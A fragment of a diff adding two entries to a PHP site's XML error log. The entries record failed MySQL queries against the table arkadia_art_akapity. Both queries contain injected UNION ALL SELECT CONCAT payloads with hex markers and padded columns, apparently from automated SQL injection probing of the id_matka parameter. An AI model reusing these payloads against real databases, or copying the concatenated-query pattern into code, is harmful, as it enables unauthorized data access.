+	<datetime>2020-04-10 11:19:33</datetime>
+	<errornum>E_USER_ERROR</errornum>
+	<errormsg>SELECT * FROM arkadia_art_akapity WHERE id_matka='-5588') AS bkVj WHERE 9830=9830 UNION ALL SELECT CONCAT(0x716a7a7a71,0x586761446d7463596f795065616847765142454b756b75514d4b63494e6d5572756e7541756d794b,0x7176716a71),70,70,70,70,70,70,70,70,70,70,70,70,70,70,70,70,70,70,70,70,70,70,70,70,70,70,70,70,70,70,70,70,70,70,70,70,70,70#' AND status=1 ORDER BY id, ## You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ') AS bkVj WHERE 9830=9830 UNION ALL SELECT CONCAT(0x716a7a7a71,0x586761446d74635' at line 1 ## </errormsg>
+	<scriptname>/klasy/class.bazasql.php</scriptname>
+	<scriptlinenum>390</scriptlinenum>
+</errorentry>
+
+<errorentry>
+	<datetime>2020-04-10 11:19:37</datetime>
+	<errornum>E_USER_ERROR</errornum>
+	<errormsg>SELECT * FROM arkadia_art_akapity WHERE id_matka='-5719') AS QrYN WHERE 4287=4287 UNION ALL SELECT CONCAT(0x716a7a7a71,0x55414e4b70757547446a,0x7176716a71),70,70,70,70,70,70,70,70,70,70,70,70,70,70,70,70,70,70,70,70,70,70,70,70,70,70,70,70,70,70,70,70,70,70,70,70,70,70#' AND status=1 ORDER BY id, ## You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ') AS QrYN WHERE 4287=4287 UNION ALL SELECT CONCAT(0x716a7a7a71,0x55414e4b7075754' at line 1 ## </errormsg>
+	<scriptname>/klasy/class.bazasql.php</scriptname>
+	<scriptlinenum>390</scriptlinenum>
+</errorentry>
+
